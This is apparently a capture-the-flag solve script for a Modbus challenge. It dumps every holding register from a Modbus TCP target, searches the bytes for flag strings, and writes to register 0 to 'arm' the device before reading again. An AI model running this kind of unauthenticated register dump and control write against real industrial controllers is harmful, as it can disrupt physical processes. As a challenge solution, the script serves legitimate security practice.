#!/usr/bin/env python3
"""Modbus Mastermind — flag grabber for a CLEAN/fresh instance.

Usage: python3 solve.py [m1|m2|HOST:PORT]

On a clean instance the author stages the flag in holding registers next to
the landmarks `MASTERMIND` (reg1000) and `0x600D`="GOOD" (reg1337). This reads
the whole map, tries the "arm" (write 'A' to reg0 -> status reads "ARMED"),
and extracts any rstcon{...}/flag{...} in every byte encoding.
"""
import sys, struct
from modbus import ModbusTCP, HOSTS

def target():
    a = sys.argv[1] if len(sys.argv) > 1 else "m1"
    if a in HOSTS:
        return HOSTS[a]
    host, _, port = a.partition(":")
    return host, int(port or 1500)

def extract(regs):
    be = b"".join(struct.pack(">H", r) for r in regs)
    le = b"".join(struct.pack("<H", r) for r in regs)
    lo = bytes(r & 0xff for r in regs)
    hi = bytes(r >> 8 for r in regs)
    hits = []
    for nm, s in [("BE", be), ("LE", le), ("LO", lo), ("HI", hi)]:
        low = s.lower()
        for needle in (b"rstcon{", b"flag{"):
            i = low.find(needle)
            while i >= 0:
                end = s.find(b"}", i)
                hits.append(s[i:end + 1] if end > 0 else s[i:i + 60])
                i = low.find(needle, i + 1)
    return hits

def main():
    host, port = target()
    print(f"[*] {host}:{port}")
    with ModbusTCP(host, port, timeout=8) as m:
        # read everything
        regs = []
        base = 0
        while base < 65536:
            cnt = min(125, 65536 - base)
            regs.extend(m.read_holding(base, cnt)); base += cnt
        print("[*] landmarks: reg1000-04 =",
              bytes(b for r in regs[1000:1005] for b in struct.pack(">H", r)),
              "| reg1337 =", hex(regs[1337]))
        hits = extract(regs)
        if hits:
            print("[+] FLAG candidates:")
            for h in sorted(set(hits)):
                print("   ", h.decode("latin1"))
            return
        # try arming
        print("[*] no flag yet; arming (reg0='A') and re-reading...")
        m.write_register(0, ord("A"))
        regs = []
        base = 0
        while base < 65536:
            cnt = min(125, 65536 - base)
            regs.extend(m.read_holding(base, cnt)); base += cnt
        hits = extract(regs)
        if hits:
            print("[+] FLAG candidates (after arm):")
            for h in sorted(set(hits)):
                print("   ", h.decode("latin1"))
        else:
            print("[-] no rstcon{}/flag{} found — instance is not clean (vandalized).")

if __name__ == "__main__":
    main()
